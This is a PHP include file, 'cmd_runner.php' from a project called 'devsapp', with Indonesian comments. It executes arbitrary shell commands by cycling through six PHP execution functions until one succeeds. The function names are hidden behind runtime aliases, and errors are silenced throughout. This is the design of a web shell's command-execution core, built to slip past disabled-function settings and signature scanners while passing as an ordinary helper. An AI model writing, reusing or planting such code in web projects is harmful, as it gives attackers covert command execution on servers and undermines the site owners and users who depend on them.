<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/cmd_runner.php                                |
// |  Adaptive command execution helpers.                              |
// |  Mencoba 6 metode eksekusi secara berurutan via CAP.              |
// +------------------------------------------------------------------+

declare(strict_types=1);

/**
 * Cek apakah setidaknya satu metode eksekusi tersedia di server ini.
 */
function cmd_available(): bool {
    foreach (['se', 'ex', 'sy', 'pt', 'po', 'pn'] as $alias) {
        if (CAP::ok($alias)) return true;
    }
    return false;
}

/**
 * Dispatch table: setiap entry adalah closure yang mencoba satu metode eksekusi.
 * Nama fungsi di-resolve saat runtime via CAP — tidak ada hardcode di sini.
 *
 * Urutan percobaan: shell_exec → exec → system → passthru → proc_open → popen
 */
$available_ops = [

    // shell_exec: return semua output sebagai string
    'se' => static function (string $cmd): ?string {
        $fn = CAP::fn('se');
        $result = @$fn($cmd . ' 2>/dev/null');
        return ($result !== null && $result !== false) ? (string)$result : null;
    },

    // exec: return output baris per baris ke dalam array
    'ex' => static function (string $cmd): ?string {
        $fn = CAP::fn('ex');
        $lines = [];
        @$fn($cmd . ' 2>/dev/null', $lines);
        return implode("\n", $lines);
    },

    // system: output langsung ke browser, di-capture via ob
    'sy' => static function (string $cmd): ?string {
        $fn = CAP::fn('sy');
        ob_start();
        @$fn($cmd . ' 2>/dev/null');
        return ob_get_clean() ?: '';
    },

    // passthru: mirip system, raw binary output
    'pt' => static function (string $cmd): ?string {
        $fn = CAP::fn('pt');
        ob_start();
        @$fn($cmd . ' 2>/dev/null');
        return ob_get_clean() ?: '';
    },

    // proc_open: full pipe control, paling fleksibel
    'po' => static function (string $cmd): ?string {
        $fn = CAP::fn('po');
        $descriptors = [
            0 => ['pipe', 'r'],   // stdin
            1 => ['pipe', 'w'],   // stdout
            2 => ['pipe', 'w'],   // stderr
        ];
        $pipes   = [];
        $process = @$fn($cmd, $descriptors, $pipes);
        if (!is_resource($process)) return null;

        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $closeFn = CAP::fn('pc');
        fclose($pipes[1]);
        fclose($pipes[2]);
        $closeFn($process);
        return (string)$output;
    },

    // popen: pipe read-only, paling sederhana
    'pn' => static function (string $cmd): ?string {
        $fn   = CAP::fn('pn');
        $pipe = @$fn($cmd . ' 2>/dev/null', 'r');
        if (!$pipe) return null;
        $output = stream_get_contents($pipe);
        pclose($pipe);
        return (string)$output;
    },
];

/**
 * Jalankan command shell. Iterasi dispatch table sampai ada metode yang berhasil.
 *
 * @param string $cmd Command yang akan dijalankan
 * @return string Output dari command, atau string kosong jika semua metode gagal
 */
function run_cmd(string $cmd): string {
    global $available_ops;
    foreach ($available_ops as $alias => $runner) {
        if (CAP::ok($alias)) {
            $output = $runner($cmd);
            if ($output !== null) return $output;
        }
    }
    return '';
}
